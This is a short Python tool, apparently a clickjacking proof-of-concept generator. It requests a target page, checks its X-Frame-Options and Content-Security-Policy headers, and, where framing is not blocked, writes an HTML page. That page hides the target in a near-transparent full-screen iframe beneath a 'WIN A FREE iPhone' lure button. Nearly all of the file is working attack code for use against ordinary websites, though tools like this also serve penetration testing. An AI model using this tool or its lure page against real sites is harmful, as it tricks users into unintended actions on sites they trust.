import requests
import sys
from termcolor import colored

POC_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.1;
            z-index: 9999;
        }}
        button {{
            position: absolute;
            top: 100px;
            left: 100px;
            z-index: 10000;
            padding: 10px 20px;
            font-size: 20px;
        }}
    </style>
</head>
<body>
    <h1>Click Me!</h1>
    <button>WIN A FREE iPhone</button>
    <iframe src="{target}" frameborder="0"></iframe>
</body>
</html>
'''

def check_headers(url):
    try:
        r = requests.get(url, timeout=10)
        xfo = r.headers.get("X-Frame-Options", "Not Set")
        csp = r.headers.get("Content-Security-Policy", "Not Set")

        print(colored(f"[🔍] X-Frame-Options: {xfo}", "cyan"))
        print(colored(f"[🔍] Content-Security-Policy: {csp}", "cyan"))

        if 'DENY' in xfo.upper() or 'SAMEORIGIN' in xfo.upper():
            print(colored("[🔒] Framing is blocked by X-Frame-Options.", "red"))
        elif 'frame-ancestors' in csp:
            print(colored("[🔒] Framing is blocked via CSP.", "red"))
        else:
            print(colored("[💥] Page may be vulnerable to Clickjacking!", "green"))
            return True

    except Exception as e:
        print(colored(f"[❌] Error: {e}", "red"))

    return False

def generate_poc(url):
    print(colored(f"\n[⚔️] Generating PoC for: {url}", "yellow"))
    html = POC_TEMPLATE.format(target=url)
    with open("clickjacking_poc.html", "w") as f:
        f.write(html)
    print(colored("[✅] PoC saved as 'clickjacking_poc.html'", "green"))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 clickjacking_poc_generator.py https://target.com/page")
        sys.exit(1)

    target_url = sys.argv[1]
    if check_headers(target_url):
        generate_poc(target_url)
